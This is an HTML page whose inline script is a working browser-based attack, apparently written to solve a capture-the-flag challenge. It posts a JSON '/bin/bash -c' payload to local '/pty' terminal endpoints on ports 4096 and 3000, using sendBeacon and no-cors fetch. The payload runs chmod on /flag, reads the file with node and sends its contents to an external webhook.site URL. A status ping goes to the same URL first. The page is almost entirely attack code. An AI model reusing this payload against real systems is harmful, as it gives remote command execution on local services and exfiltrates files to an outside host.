<!DOCTYPE html>
<html>
<body>
    <script>
        const WEBHOOK = 'https://webhook.site/6c7b9fec-12ce-4d1c-b5ce-5938576168f4';
        
        // 信号：开始最后一次尝试
        fetch(`${WEBHOOK}?status=last_resort_attempt`);

        // 构建命令：读取 flag 并通过 curl 或 node 回传
        // 增加了一个 000 权限绕过逻辑：虽然我们是 node 用户，
        // 但有时直接读取 000 文件会失败，尝试先 chmod 444
        const cmd = `chmod 444 /flag && node -e "fetch('${WEBHOOK}?flag=' + encodeURIComponent(require('fs').readFileSync('/flag', 'utf8')))"`;

        const payload = JSON.stringify({
            command: '/bin/bash',
            args: ['-c', cmd]
        });

        // 策略 1: 使用 localhost 替代 127.0.0.1
        function tryPort(port) {
            const targets = [
                `http://localhost:${port}/pty`,
                `http://127.0.0.1:${port}/pty`
            ];

            targets.forEach(url => {
                // A. 尝试 sendBeacon
                try {
                    navigator.sendBeacon(url, new Blob([payload], {type: 'text/plain'}));
                } catch(e) {}

                // B. 尝试 fetch no-cors
                fetch(url, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: payload
                }).catch(e => {});
            });
        }

        // 循环尝试端口
        [4096, 3000].forEach(p => tryPort(p));
    </script>
</body>
</html>
